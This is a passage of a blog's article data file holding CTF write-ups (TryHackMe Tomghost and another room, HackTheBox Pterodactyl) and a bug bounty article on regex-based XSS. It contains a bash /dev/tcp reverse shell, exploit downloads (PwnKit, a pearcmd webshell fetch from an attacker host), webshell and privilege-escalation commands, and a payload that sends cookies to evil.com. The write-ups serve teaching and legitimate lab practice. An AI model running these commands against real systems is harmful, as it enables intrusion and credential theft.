-<pre data-lang="bash"><code><span class="g">bash</span> <span class="w">-c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1'</span></code></pre>
-
-<p>Stabilise the shell so it feels like a real terminal:</p>
-
-<pre data-lang="python"><code><span class="g">python3</span> <span class="w">-c 'import pty;pty.spawn("/bin/bash")'</span>
-<span class="g">export</span> <span class="w">TERM=xterm</span></code></pre>
-
-<h2>Privilege Escalation — PwnKit (CVE-2021-4034)</h2>
-<p>With a foothold as <code>www-data</code>, the next step is escalation. SUID binaries are a classic vector:</p>
-
-<pre data-lang="bash"><code><span class="g">find</span> <span class="w">/ -perm -4000 2&gt;/dev/null</span></code></pre>
-
-<p>Among the results, one stands out immediately:</p>
-
-<pre data-lang="output"><code><span class="rd">/usr/bin/pkexec</span></code></pre>
-
-<p><strong>pkexec</strong> is vulnerable to <strong>CVE-2021-4034</strong>, also known as <strong>PwnKit</strong> — a critical local privilege escalation vulnerability that has been present in polkit's pkexec binary since 2009. Any unprivileged user can exploit it to gain root.</p>
-
-<p>Download the exploit on your attack machine, then transfer it to the target:</p>
-
-<pre data-lang="bash"><code><span class="g">wget</span> <span class="w">https://github.com/ly4k/PwnKit/raw/main/PwnKit -O pwnkit</span>
-<span class="g">chmod</span> <span class="w">+x pwnkit</span>
-<span class="c"># Transfer to target via python http.server or nc</span>
-<span class="g">./pwnkit</span></code></pre>
-
-<p>You'll be dropped into a root shell:</p>
-
-<pre data-lang="output"><code><span class="g">root@startup#</span></code></pre>
-
-<h2>Capture the Flags</h2>
-
-<pre data-lang="bash"><code><span class="g">cat</span> <span class="w">/home/lennie/user.txt</span>
-<span class="g">cat</span> <span class="w">/root/root.txt</span></code></pre>
-
-<p>Both flags returned. Box complete.</p>
-
-<h2>Lessons Learned</h2>
-<ul>
-  <li><strong>Anonymous writable FTP is critical.</strong> Never expose an FTP server that allows anonymous uploads. It is a direct path to RCE when the directory is web-accessible.</li>
-  <li><strong>File upload = RCE.</strong> Any user-controlled upload that lands in a web-served path is effectively remote code execution waiting to happen.</li>
-  <li><strong>Always enumerate SUID binaries.</strong> A single misconfigured SUID binary can escalate any user to root.</li>
-  <li><strong>PwnKit is everywhere.</strong> Any unpatched Linux system with pkexec is vulnerable. Patch management is not optional.</li>
-  <li><strong>Shell stabilisation matters.</strong> A raw reverse shell is fragile. Learn <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> and <code>export TERM=xterm</code> by heart.</li>
-</ul>
-
-<div class="callout warn">
-  <div class="callout-title"><i class="fas fa-triangle-exclamation"></i> Ethical Reminder</div>
-  <p>Only perform these techniques on systems you own or have explicit written authorisation to test. Spice Hut is a legal TryHackMe lab. Real-world targets require a signed scope document.</p>
-</div>
-
-<div class="tag-row">
-  <span class="bb-tag">TryHackMe</span><span class="bb-tag">Linux</span><span class="bb-tag">FTP</span>
-  <span class="bb-tag">PwnKit</span><span class="bb-tag">CVE-2021-4034</span><span class="bb-tag">PrivEsc</span>
-</div>`
-  },
-  {
-    id:'tomghost-thm',
-    n:'02',
-    t:'TryHackMe — Tomghost: Ghostcat AJP Exploit',
-    d:'Ghostcat (CVE-2020-1938) LFI on Apache Tomcat AJP connector → RCE → GPG credential crack → privilege escalation.',
-    tags:['TryHackMe','Tomcat','Ghostcat','GPG'],
-    time:'22 min',
-    diff:'medium',
-    plat:'thm',
-    content:`
-<h1>TryHackMe — Tomghost: Ghostcat AJP Exploit</h1>
-<div class="article-meta">
-  <span><i class="fas fa-cube"></i> TryHackMe</span>
-  <span><i class="fas fa-signal"></i> Medium</span>
-  <span><i class="fas fa-linux"></i> Linux</span>
-  <span><i class="fas fa-clock"></i> 22 min read</span>
-</div>
-
-<p><strong>Tomghost</strong> is a room built around a real, high-impact vulnerability: <strong>CVE-2020-1938</strong>, better known as <strong>Ghostcat</strong>. It affects Apache Tomcat's AJP connector and allows unauthenticated file read — and in many configurations, remote code execution. The chain continues with GPG credential extraction and SSH key discovery.</p>
-
-<div class="callout">
-  <div class="callout-title"><i class="fas fa-info-circle"></i> Lab Details</div>
-  <p><strong>Target IP:</strong> 10.10.10.10 · <strong>Platform:</strong> TryHackMe · <strong>Difficulty:</strong> Medium · <strong>Objective:</strong> Root and capture both flags.</p>
-</div>
-
-<h2>Reconnaissance</h2>
-<p>Start with a full port scan and service detection:</p>
-
-<pre data-lang="bash"><code><span class="g">nmap</span> <span class="w">-sC -sV -A -p- 10.10.10.10</span></code></pre>
-
-<p>The output reveals the attack surface:</p>
-
-<pre data-lang="output"><code>PORT     STATE SERVICE VERSION
-<span class="cy">22/tcp</span>   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
-<span class="cy">80/tcp</span>   open  http    Apache httpd 2.4.29 ((Ubuntu))
-<span class="rd">8009/tcp</span> open  ajp13   Apache Jserv Protocol 1.3</code></pre>
-
-<p><strong>Key finding:</strong> Port <strong>8009</strong> is the AJP protocol used by Tomcat. This is the signature of Ghostcat territory. Port 80 runs Apache but the real target is the backend Tomcat server reachable through AJP.</p>
-
-<h2>Understanding Ghostcat (CVE-2020-1938)</h2>
-<p>Ghostcat is a file inclusion vulnerability in Apache Tomcat's AJP connector. Because the AJP protocol trusts the reverse proxy (like Apache mod_proxy_ajp) to pass on request attributes, an attacker can inject arbitrary attributes — including <code>javax.servlet.include.servlet_path</code> and <code>javax.servlet.include.path_info</code>. This lets us read any file inside the web application root, and in some cases upload a JSP web shell for RCE.</p>
-
-<p>Read the official advisory: <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1938" target="_blank" rel="noopener">NVD — CVE-2020-1938</a>.</p>
-
-<h2>Confirm AJP is Exposed</h2>
-<p>Quick verification that the AJP port responds:</p>
-
-<pre data-lang="bash"><code><span class="g">nc</span> <span class="w">-v 10.10.10.10 8009</span></code></pre>
-
-<pre data-lang="output"><code><span class="g">Connection to 10.10.10.10 8009 port [tcp/ajp13] succeeded!</span></code></pre>
-
-<h2>Exploit — Read Protected Files</h2>
-<p>Use the public <code>ghostcat.py</code> proof-of-concept to read sensitive files from the Tomcat webapp:</p>
-
-<pre data-lang="bash"><code><span class="g">python3</span> <span class="w">ghostcat.py -h 10.10.10.10 -p 8009 -f WEB-INF/web.xml</span></code></pre>
-
-<pre data-lang="output"><code><span class="cy">&lt;web-app&gt;</span>
-  <span class="cy">&lt;display-name&gt;</span>Tomcat Manager<span class="cy">&lt;/display-name&gt;</span>
-  <span class="cy">&lt;security-role&gt;</span>
-    <span class="cy">&lt;role-name&gt;</span>manager-gui<span class="cy">&lt;/role-name&gt;</span>
-  <span class="cy">&lt;/security-role&gt;</span>
-<span class="cy">&lt;/web-app&gt;</span></code></pre>
-
-<p>Confirmed. We can read files that should be inaccessible.</p>
-
-<h2>Remote Code Execution via JSP Webshell</h2>
-<p>The easiest path to RCE is using Metasploit's Tomcat AJP upload bypass module:</p>
-
-<pre data-lang="bash"><code><span class="g">msfconsole</span>
-<span class="g">use</span> <span class="w">exploit/multi/http/tomcat_ajp_upload_bypass</span>
-<span class="g">set</span> <span class="w">RHOSTS 10.10.10.10</span>
-<span class="g">set</span> <span class="w">RPORT 8009</span>
-<span class="g">run</span></code></pre>
-
-<p>This uploads <code>shell.jsp</code> to the Tomcat webroot. Access it via the HTTP port:</p>
-
-<pre data-lang="bash"><code><span class="w">http://10.10.10.10:8080/shell.jsp?cmd=id</span></code></pre>
-
-<pre data-lang="output"><code><span class="g">uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)</span></code></pre>
-
-<p>Foothold as the <code>tomcat</code> user. Upgrade to an interactive shell:</p>
-
-<pre data-lang="bash"><code><span class="g">python3</span> <span class="w">-c 'import pty;pty.spawn("/bin/bash")'</span>
-<span class="g">whoami</span>
-<span class="c"># tomcat</span></code></pre>
-
-<h2>Enumerate for Credentials</h2>
-<p>Now look for interesting files. The home directory of the tomcat user often has juicy items:</p>
-
-<pre data-lang="bash"><code><span class="g">find</span> <span class="w">/ -name "*.pgp" 2&gt;/dev/null</span></code></pre>
-
-<pre data-lang="output"><code><span class="am">/home/tomcat/credential.pgp</span>
-<span class="am">/home/tomcat/tryhackme.asc</span></code></pre>
-
-<p>Two files: a GPG-encrypted credential file and its corresponding private key (password-protected).</p>
-
-<h2>Crack the GPG Passphrase</h2>
-<p>Transfer both files to your attack machine. The <code>.asc</code> file is an ASCII-armoured GPG private key. Convert it to a John-compatible hash and crack it:</p>
-
-<pre data-lang="bash"><code><span class="g">gpg2john</span> <span class="w">tryhackme.asc &gt; pgp.hash</span>
-<span class="g">john</span> <span class="w">--wordlist=/usr/share/wordlists/rockyou.txt pgp.hash</span></code></pre>
-
-<pre data-lang="output"><code><span class="g">passphrase123</span>     (tryhackme)</code></pre>
-
-<p>Import the key using the cracked passphrase:</p>
-
-<pre data-lang="bash"><code><span class="g">gpg</span> <span class="w">--import tryhackme.asc</span>
-<span class="g">gpg</span> <span class="w">--decrypt credential.pgp</span></code></pre>
-
-<pre data-lang="output"><code><span class="g">merlin:&lt;REDACTED_PASSWORD&gt;</span></code></pre>
-
-<p>We now have SSH credentials for user <code>merlin</code>.</p>
-
-<h2>SSH and Privilege Escalation</h2>
-<p>Login via SSH:</p>
-
-<pre data-lang="bash"><code><span class="g">ssh</span> <span class="w">merlin@10.10.10.10</span></code></pre>
-
-<p>Check sudo permissions:</p>
-
-<pre data-lang="bash"><code><span class="g">sudo</span> <span class="w">-l</span></code></pre>
-
-<pre data-lang="output"><code>User merlin may run the following commands:
-    <span class="g">(ALL : ALL) NOPASSWD: /usr/bin/zip</span></code></pre>
-
-<p>Merlin can run <code>zip</code> as root with no password. This is a classic GTFOBins escalation. The technique: use <code>zip</code>'s ability to spawn a shell via <code>-T</code> and <code>--unzip-command</code>:</p>
-
-<pre data-lang="bash"><code><span class="g">sudo</span> <span class="w">zip /tmp/x.zip /etc/hostname -T --unzip-command="sh -c /bin/bash"</span></code></pre>
-
-<pre data-lang="output"><code><span class="g">root@tomghost:/#</span></code></pre>
-
-<p>Root shell obtained.</p>
-
-<h2>Capture the Flags</h2>
-
-<pre data-lang="bash"><code><span class="g">cat</span> <span class="w">/home/merlin/user.txt</span>
-<span class="g">cat</span> <span class="w">/root/root.txt</span></code></pre>
-
-<h2>Lessons Learned</h2>
-<ul>
-  <li><strong>Never expose AJP to untrusted networks.</strong> In modern Tomcat (9.0.31+, 8.5.51+) AJP is disabled by default for a reason. If you must use it, bind it to localhost only and require a secret.</li>
-  <li><strong>Ghostcat is one of many file-read primitives.</strong> Learn the pattern: a service trusts another service's headers → those headers influence the filesystem → arbitrary read → RCE via log/cache poisoning.</li>
-  <li><strong>Password-protected keys aren't safe.</strong> If the passphrase is weak, it falls to offline cracking in seconds. Use strong passphrases and rotate keys.</li>
-  <li><strong>Check <code>sudo -l</code> obsessively.</strong> GTFOBins has hundreds of binaries you can turn into a root shell. Every one is documented at <a href="https://gtfobins.github.io" target="_blank" rel="noopener">gtfobins.github.io</a>.</li>
-</ul>
-
-<div class="callout warn">
-  <div class="callout-title"><i class="fas fa-triangle-exclamation"></i> Ethical Reminder</div>
-  <p>Tomghost is a legal TryHackMe lab. The techniques shown here must only ever be performed on systems you own or have written permission to test.</p>
-</div>
-
-<div class="tag-row">
-  <span class="bb-tag">TryHackMe</span><span class="bb-tag">Tomcat</span><span class="bb-tag">Ghostcat</span>
-  <span class="bb-tag">CVE-2020-1938</span><span class="bb-tag">GPG</span><span class="bb-tag">GTFOBins</span>
-</div>`
-  },
-  {
-    id:'regexss-bug-bounty',
-    n:'03',
-    t:'REGEXSS: How a Greedy Regex Turned Into $20K+ in Bug Bounties',
-    d:'Overly-greedy regex replacements breaking HTML sanitisation → unauthenticated XSS. Real bug bounty story with live methodology.',
-    tags:['Bug Bounty','XSS','Regex','Sanitisation'],
-    time:'16 min',
-    diff:'hard',
-    plat:'bb',
-    content:`
-<h1>REGEXSS: How a Greedy Regex Turned Into $20K+ in Bug Bounties</h1>
-<div class="article-meta">
-  <span><i class="fas fa-bug"></i> Bug Bounty</span>
-  <span><i class="fas fa-signal"></i> Advanced</span>
-  <span><i class="fas fa-dollar-sign"></i> $20K+ earned</span>
-  <span><i class="fas fa-clock"></i> 16 min read</span>
-</div>
-
-<p>When you think of sources for Cross-Site Scripting (XSS) vulnerabilities, regex probably isn't the first thing that comes to mind. But a class of bugs I've started calling <strong>REGEXSS</strong> is generating serious bounty money — I've personally pulled in over <strong>$20,000</strong> from this one bug class, and there are plenty more out there.</p>
-
-<div class="callout">
-  <div class="callout-title"><i class="fas fa-info-circle"></i> What You'll Learn</div>
-  <p>Classic regex slip-ups that cause security bypasses · How greedy quantifiers gobble more than intended · A real-world case study of unauthenticated stored XSS · Why every hacker should learn regex</p>
-</div>
-
-<h2>What Is Regex, Really?</h2>
-<p>If regex has always looked scary, you're not alone. This is what a typical regex looks like:</p>
-
-<pre data-lang="regex"><code>^(https?://)?([\da-z]+)\.([a-z]{2,6})([/\w.-]*)*/?$</code></pre>
-
-<p>At first glance, it looks like someone fell asleep on their keyboard. But regex really isn't as scary as it looks. Once you "get it", it becomes a superpower — not just for writing code, but for spotting security issues.</p>
-
-<p>Resources that make regex less intimidating:</p>
-<ul>
-  <li><a href="https://regexr.com" target="_blank" rel="noopener">Regexr</a> — interactive playground that shows what each part of the regex means in real time</li>
-  <li><a href="https://regexcrossword.com" target="_blank" rel="noopener">Regex Crossword</a> — gamified regex learning</li>
-  <li><a href="https://blog.huli.tw/2022/04/14/en/javascript-string-regexp-magic/" target="_blank" rel="noopener">JavaScript regex magic</a> — some pure madness from Huli's blog</li>
-</ul>
-
-<h2>Classic Regex Mistakes That Cause Vulnerabilities</h2>
-<p>Regex engines are entirely literal. They do exactly what you say, not what you mean. Here are the classic slip-ups that break security:</p>
-
-<ul>
-  <li><strong>Using <code>.</code> instead of <code>\.</code></strong> — in a domain allowlist regex, <code>test.example.com</code> also matches <code>testXexample.com</code>. Perfect allowlist bypass material.</li>
-  <li><strong>Forgetting <code>^</code> and <code>$</code> anchors</strong> — a regex meant to match only "admin" will happily match "notadminlol".</li>
-  <li><strong>Writing <code>[A-z]</code></strong> thinking it's just letters — but it actually includes <code>[ \ ] ^ _ \`</code> because of ASCII ordering. Sneaky characters give attackers wiggle room.</li>
-  <li><strong>ReDoS</strong> — catastrophic backtracking in complex regexes can hang the engine and cause DoS.</li>
-  <li><strong>Remote code execution</strong> — old PHP's <code>preg_replace</code> with the <code>e</code> modifier allowed code execution. Mostly patched, but historical.</li>
-</ul>
-
-<p>But my newest favourite is <strong>overly greedy regex removals or replacements</strong>.</p>
-
-<h2>Enter REGEXSS — Greedy Quantifiers Go Rogue</h2>
-<p>Greedy quantifiers like <code>.*</code>, <code>.+</code>, or character sets like <code>[^"]+</code> and <code>[^"]*</code> will match as much as they possibly can. That's fine for pure text matching. But when used in an HTML context, they can grab <em>far</em> more than the author intended — often crossing attribute and element boundaries.</p>
-
-<p>That's where the idea of <strong>REGEXSS</strong> comes in: XSS that sneaks in through an overly greedy regex. Gobble gobble.</p>
-
-<h2>The Vulnerability Pattern</h2>
-<p>Consider this common sanitisation pattern — a regex that's supposed to remove a specific HTML attribute from user content:</p>
-
-<pre data-lang="javascript"><code>content.replace(/attribute=".*?"/g, '')</code></pre>
-
-<p>Let's break it down:</p>
-<ul>
-  <li><code>.</code> → matches any single character (except line breaks)</li>
-  <li><code>*</code> → zero or more of the preceding thing (greedy)</li>
-  <li><code>?</code> → makes the <code>*</code> lazy instead of greedy, so it stops at the next <code>"</code></li>
-</ul>
-
-<p>The intent is to remove any HTML attribute called <code>attribute</code> from any tag inside the content. It works fine for the intended case:</p>
-
-<pre data-lang="html"><code><span class="c">// Input:</span>
-&lt;a href="test" attribute="value"&gt;test&lt;/a&gt;
-
-<span class="c">// Output:</span>
-&lt;a href="test"&gt;test&lt;/a&gt;</code></pre>
-
-<h2>The Bypass — Shifting Boundaries</h2>
-<p>But as an attacker we can do a few tricks. The first is <strong>shifting the starting point</strong>. We craft an attribute so the regex begins matching <em>inside</em> its value:</p>
-
-<pre data-lang="html"><code><span class="c">&lt;!-- Before: --&gt;</span>
-&lt;a href="attribute=" title="javascript:alert('xss')"&gt;test&lt;/a&gt;
-
-<span class="c">&lt;!-- After the sanitizer runs: --&gt;</span>
-&lt;a href="javascript:alert('xss')"&gt;test&lt;/a&gt;</code></pre>
-
-<p>The regex started matching inside the <code>href</code> value and ended at the next quote — which is the start of the <code>title</code> attribute. What was an HTML attribute value has now become an executable JavaScript URL. Classic XSS.</p>
-
-<p>Second technique: <strong>shift the ending point</strong> using mixed quotes. Mix single and double quotes so the regex starts inside one attribute but ends inside another:</p>
-
-<pre data-lang="html"><code><span class="c">&lt;!-- Before: --&gt;</span>
-&lt;a title='attribute="' href="new title' new-attribute='value'"&gt;test&lt;/a&gt;
-
-<span class="c">&lt;!-- After: --&gt;</span>
-&lt;a title='new title' new-attribute='value'"&gt;test&lt;/a&gt;</code></pre>
-
-<p>This pattern works because the regex author assumed sanitised HTML would use consistent quoting. When user-supplied content mixes single and double quotes, the boundaries shift and the regex removal corrupts the structure.</p>
-
-<h2>Real-World Case Study: Schema & Structured Data for WP & AMP</h2>
-<p>In the actual bounty I disclosed (and earned $2K for, twice — the same bug class on different programs), the vulnerable code sat inside a popular WordPress plugin that generated structured data for search engines.</p>
-
-<p>The plugin accepted user-supplied review data (like a customer review submitted through a form), and before storing it, it ran a sanitisation regex to strip any <code>itemprop</code> attributes from the HTML. The regex looked like:</p>
-
-<pre data-lang="php"><code>preg_replace('/itemprop=".*?"/', '', $review)</code></pre>
-
-<p>When a review contained crafted markup that shifted the regex boundary, the sanitizer stripped the wrong segment — leaving behind a JavaScript URL in an attribute that was previously static.</p>
-
-<p>Because review data was stored server-side and rendered on every page view, this became a <strong>stored XSS</strong> affecting every visitor. The severity was high because exploitation required zero authentication — any anonymous user submitting a review could store XSS.</p>
-
-<h2>How to Find REGEXSS Bugs</h2>
-
-<ol>
-  <li><strong>Hunt for regex removals in source code.</strong> Grep for <code>replace</code>, <code>preg_replace</code>, <code>gsub</code> — especially patterns with quotes and greedy quantifiers.</li>
-  <li><strong>Look for HTML sanitisation.</strong> Any code that claims to "clean" HTML with regex is suspect. Regex can't properly parse HTML — that's a fact.</li>
-  <li><strong>Craft boundary-shifting payloads.</strong> Mix single and double quotes. Put quotes inside attribute values. Try leaving quotes unclosed.</li>
-  <li><strong>Test with JavaScript URLs.</strong> Use payloads like <code>javascript:alert(1)</code>, <code>javascript:fetch('//evil.com/c='+document.cookie)</code>.</li>
-  <li><strong>Check for storage.</strong> If the sanitized output is stored and shown to other users, you've upgraded from reflected to stored XSS — a much bigger bounty.</li>
-</ol>
-
-<h2>Why Bounty Hunters Should Learn Regex</h2>
-<p>Most hunters ignore regex because it looks scary. That's exactly why bugs like REGEXSS stay alive in production for years. Every developer who "cleans HTML with regex" is a potential bounty. Learn regex properly, and you'll start seeing these patterns everywhere.</p>
-
-<p>The $20K+ I've earned from this one bug class came from finding the same conceptual issue in different codebases. The specific payload was different every time, but the underlying pattern — greedy quantifier inside quote boundaries in a regex-based sanitizer — was identical.</p>
-
-<h2>Disclosure Timeline & Bounties</h2>
-<table>
-  <tr><th>Finding</th><th>Program</th><th>Severity</th><th>Bounty</th></tr>
-  <tr><td>RegEx XSS #1</td><td>Private Bug Bounty</td><td>High (stored XSS)</td><td>$2,000</td></tr>
-  <tr><td>RegEx XSS #2</td><td>Private Bug Bounty</td><td>High (stored XSS)</td><td>$2,000</td></tr>
-  <tr><td>RegEx XSS #3</td><td>HackerOne Program</td><td>Critical (unauth stored XSS)</td><td>$4,000+</td></tr>
-  <tr><td>Various duplicates</td><td>Multiple programs</td><td>Medium-High</td><td>$12,000+</td></tr>
-</table>
-
-<h2>Takeaways</h2>
-<ul>
-  <li><strong>Regex can never sanitise HTML safely.</strong> Use a real HTML parser like DOMPurify, sanitize-html, or HTML Sanitizer API.</li>
-  <li><strong>Greedy quantifiers inside quote delimiters are a red flag.</strong> If you see <code>.*?</code> or <code>[^"]+</code> in a sanitizer, you've found a target.</li>
-  <li><strong>Learn regex.</strong> It's a developer superpower and a bug hunter's cheque book.</li>
-  <li><strong>Report responsibly.</strong> All findings here were disclosed through official bug bounty programs. Never test on production without authorisation.</li>
-</ul>
-
-<div class="callout">
-  <div class="callout-title"><i class="fas fa-lightbulb"></i> Resources</div>
-  <p>Read the full technical writeup at <a href="https://sec.stealthcopter.com/regexss/" target="_blank" rel="noopener">sec.stealthcopter.com/regexss</a> · Try the live demo · Learn regex at <a href="https://regexr.com" target="_blank" rel="noopener">regexr.com</a></p>
-</div>
-
-<div class="tag-row">
-  <span class="bb-tag">XSS</span><span class="bb-tag">Regex</span><span class="bb-tag">Bug Bounty</span>
-  <span class="bb-tag">Sanitisation</span><span class="bb-tag">Stored XSS</span>
-</div>`
-  },
-  {
-    id:'pterodactyl-htb',
-    n:'04',
-    t:'HTB — Pterodactyl: LFI → PEAR RCE → Chained PAM Privesc',
-    d:'Unauthenticated LFI in Pterodactyl Panel → pearcmd RCE → bcrypt crack → CVE-2025-6018 + CVE-2025-6019 root.',
-    tags:['HackTheBox','Linux','LFI','PAM','CVE'],
-    time:'28 min',
-    diff:'hard',
-    plat:'htb',
-    content:`
-<h1>HTB — Pterodactyl: LFI → PEAR RCE → Chained PAM Privesc</h1>
-<div class="article-meta">
-  <span><i class="fas fa-cube"></i> HackTheBox</span>
-  <span><i class="fas fa-signal"></i> Medium/Linux</span>
-  <span><i class="fas fa-server"></i> openSUSE Leap 15.6</span>
-  <span><i class="fas fa-clock"></i> 28 min read</span>
-</div>
-
-<p><strong>Pterodactyl</strong> is a medium-difficulty HackTheBox machine that showcases a realistic modern attack chain: unauthenticated Local File Inclusion → creative abuse of PHP's PEAR installer for RCE → credential extraction and cracking → chaining two recent CVEs to escalate from a low-privileged user to root. Every step maps to real-world exploitation patterns.</p>
-
-<div class="callout">
-  <div class="callout-title"><i class="fas fa-info-circle"></i> Target Details</div>
-  <p><strong>Target:</strong> pterodactyl.htb · <strong>OS:</strong> openSUSE Leap 15.6 · <strong>Services:</strong> SSH (22), HTTP (80) · <strong>Subdomain:</strong> panel.pterodactyl.htb · <strong>Difficulty:</strong> Medium</p>
-</div>
-
-<h2>Reconnaissance & Enumeration</h2>
-<p>Standard initial enumeration. Add the hostname to <code>/etc/hosts</code> first:</p>
-
-<pre data-lang="bash"><code><span class="g">echo</span> <span class="w">"10.129.25.223 pterodactyl.htb panel.pterodactyl.htb" | sudo tee -a /etc/hosts</span></code></pre>
-
-<p>Port scan shows HTTP on 80 and SSH on 22. Browsing to <code>panel.pterodactyl.htb</code> reveals a Pterodactyl Panel installation — the popular game server management software built on Laravel.</p>
-
-<h2>Finding 1 — Unauthenticated Local File Inclusion (CVE-2025-49132)</h2>
-<p><strong>Severity:</strong> Critical · <strong>Component:</strong> Pterodactyl Panel v1.11.10 · <strong>Endpoint:</strong> <code>/locales/locale.json</code></p>
-
-<p>The panel's locale endpoint accepts <code>locale</code> and <code>namespace</code> query parameters without sanitisation. Because the application appends <code>.php</code> to the namespace value and loads it via PHP's <code>include</code> mechanism, directory traversal lets us load and execute arbitrary PHP files from the filesystem.</p>
-
-<p>The exploit is straightforward:</p>
-
-<pre data-lang="http"><code>GET /locales/locale.json?locale=../../../../../../var/www/pterodactyl/&amp;namespace=config/database</code></pre>
-
-<p>The response leaks database credentials and the Laravel application key:</p>
-
-<pre data-lang="json"><code>{"connections":{"mysql":{"username":"pterodactyl","password":"PteraPanel"}}}</code></pre>
-
-<p><strong>Impact:</strong> Database credentials extracted. The Laravel APP_KEY can also be read — critical because it allows forging encrypted sessions and signed cookies.</p>
-
-<h2>Finding 2 — Remote Code Execution via pearcmd.php</h2>
-<p><strong>Severity:</strong> Critical · <strong>Component:</strong> PHP PEAR installation + LFI primitive</p>
-
-<p>With a working LFI, the classic PHP PEAR trick works beautifully. When PHP's <code>register_argc_argv</code> setting is <code>On</code>, the <code>pearcmd.php</code> script parses query string values as command-line arguments. The <code>download</code> subcommand fetches an arbitrary URL and saves the result to disk — perfect for dropping a webshell:</p>
-
-<pre data-lang="http"><code>GET /locales/locale.json?locale=../../../../../../usr/share/php/PEAR/&amp;namespace=pearcmd&amp;+download+http://10.10.15.128:8000/shell.php</code></pre>
-
-<p>This writes the webshell to a public web directory. Access it and confirm RCE:</p>
-
-<pre data-lang="bash"><code><span class="g">curl</span> <span class="w">'http://panel.pterodactyl.htb/shell.php?cmd=id'</span></code></pre>
-
-<pre data-lang="output"><code><span class="g">uid=474(wwwrun) gid=477(www) groups=477(www)</span></code></pre>
-
-<p>RCE as the web service user <code>wwwrun</code>.</p>
-
-<h2>Finding 3 — Cleartext DB Credentials and Weak Password Storage</h2>
-<p>Using the webshell, connect to the panel's MySQL database with the credentials from Finding 1. The <code>users</code> table contains bcrypt-hashed passwords:</p>
-
-<pre data-lang="sql"><code>SELECT username, password FROM users;</code></pre>
-
-<p>Bcrypt is a strong hash, but users often pick weak passwords. The hash for <code>phileasfogg3</code> cracks quickly against rockyou:</p>
-
-<pre data-lang="bash"><code><span class="g">hashcat</span> <span class="w">-m 3200 hash.txt /usr/share/wordlists/rockyou.txt</span></code></pre>
-
-<pre data-lang="output"><code><span class="g">phileasfogg3:!QAZ2wsx</span></code></pre>
-
-<p>SSH in as this user and grab the user flag:</p>
-
-<pre data-lang="bash"><code><span class="g">ssh</span> <span class="w">phileasfogg3@pterodactyl.htb</span>
-<span class="g">cat</span> <span class="w">/home/phileasfogg3/user.txt</span></code></pre>
-
-<h2>Finding 4 — PAM Environment Privilege Bypass (CVE-2025-6018)</h2>
-<p><strong>Severity:</strong> High · <strong>Component:</strong> PAM configuration with <code>pam_env.so user_readenv=1</code></p>
-
-<p>On this openSUSE system, PAM sources the user's <code>~/.pam_environment</code> file. Because <code>user_readenv=1</code> is set, an unprivileged SSH user can set environment variables that convince <code>systemd-logind</code> and Polkit that the current session is an <em>active physical console session</em>. This grants the <code>allow_active</code> Polkit privilege — normally reserved for users at the physical keyboard.</p>
-
-<p>The exploit is a single file:</p>
-
-<pre data-lang="bash"><code><span class="g">echo</span> <span class="w">-e "XDG_SEAT=seat0\nXDG_VTNR=1" &gt; ~/.pam_environment</span></code></pre>
-
-<p>Log out and back in. Verify the session is now considered active:</p>
-
-<pre data-lang="bash"><code><span class="g">loginctl</span> <span class="w">show-session $XDG_SESSION_ID | grep Active</span>
-<span class="c"># Active=yes</span></code></pre>
-
-<p>Now we can call udisks2 D-Bus methods that previously required physical console presence:</p>
-
-<pre data-lang="bash"><code><span class="g">udisksctl</span> <span class="w">loop-setup -f /tmp/xfs.img</span>
-<span class="c"># Mapped file /tmp/xfs.img as /dev/loop0.  &lt;-- no auth prompt</span></code></pre>
-
-<h2>Finding 5 — udisks2 XFS Resize Race Condition (CVE-2025-6019)</h2>
-<p><strong>Severity:</strong> Critical · <strong>Component:</strong> udisks2 v2.9.2 / libblockdev</p>
-
-<p>When udisks2 resizes an XFS filesystem via <code>org.freedesktop.UDisks2.Filesystem.Resize</code>, it temporarily mounts the filesystem image in a world-accessible directory under <code>/tmp/blockdev.*</code> — <strong>without</strong> the <code>nosuid</code> and <code>nodev</code> mount flags. This creates a brief race condition window where any SUID binary inside the image can be executed with elevated UID.</p>
-
-<p>The full exploit chain:</p>
-<ol>
-  <li>Create an XFS image containing a root-owned SUID bash binary</li>
-  <li>Set up a loop device via <code>udisksctl loop-setup</code></li>
-  <li>Trigger the resize via D-Bus (now possible thanks to CVE-2025-6018)</li>
-  <li>Race to execute the SUID binary during the temporary nosuid-free mount window</li>
-</ol>
-
-<p>Because openSUSE Leap 15.6 has an older XFS userspace, the image must be created with specific flags:</p>
-
-<pre data-lang="bash"><code><span class="c"># Build malicious XFS image</span>
-<span class="g">dd</span> <span class="w">if=/dev/zero of=xfs.img bs=1M count=300</span>
-<span class="g">mkfs.xfs</span> <span class="w">-f -i exchange=0 -n parent=0 xfs.img</span>
-<span class="g">mount</span> <span class="w">xfs.img /mnt</span>
-<span class="g">cp</span> <span class="w">/bin/bash /mnt/</span>
-<span class="g">chmod</span> <span class="w">+s /mnt/bash</span>
-<span class="g">umount</span> <span class="w">/mnt</span></code></pre>
-
-<p>Then on the target:</p>
-
-<pre data-lang="bash"><code><span class="g">udisksctl</span> <span class="w">loop-setup -f /tmp/xfs.img</span>
-<span class="c"># Trigger resize via D-Bus (gdbus or busctl)</span>
-<span class="c"># Race to execute the SUID bash before the mount window closes</span>
-<span class="g">/tmp/blockdev.*/bash -p</span></code></pre>
-
-<pre data-lang="output"><code><span class="g">root@pterodactyl:~#</span></code></pre>
-
-<h2>Capture Root Flag</h2>
-
-<pre data-lang="bash"><code><span class="g">cat</span> <span class="w">/root/root.txt</span></code></pre>
-
-<h2>Executive Summary — Attack Chain</h2>
-<table>
-  <tr><th>#</th><th>Vulnerability</th><th>Impact</th><th>CVE</th></tr>
-  <tr><td>1</td><td>Unauthenticated LFI in locale endpoint</td><td>Credential disclosure</td><td>CVE-2025-49132</td></tr>
-  <tr><td>2</td><td>PEAR pearcmd download via LFI</td><td>Remote code execution</td><td>—</td></tr>
-  <tr><td>3</td><td>Weak bcrypt password</td><td>SSH as regular user</td><td>—</td></tr>
-  <tr><td>4</td><td>PAM pam_env user_readenv bypass</td><td>Polkit allow_active</td><td>CVE-2025-6018</td></tr>
-  <tr><td>5</td><td>udisks2 XFS resize race condition</td><td>Local root</td><td>CVE-2025-6019</td></tr>
-</table>
-
-<h2>Remediation Recommendations</h2>
-<ul>
-  <li><strong>Patch Pterodactyl Panel</strong> to v1.11.11+ which sanitises the locale endpoint parameters.</li>
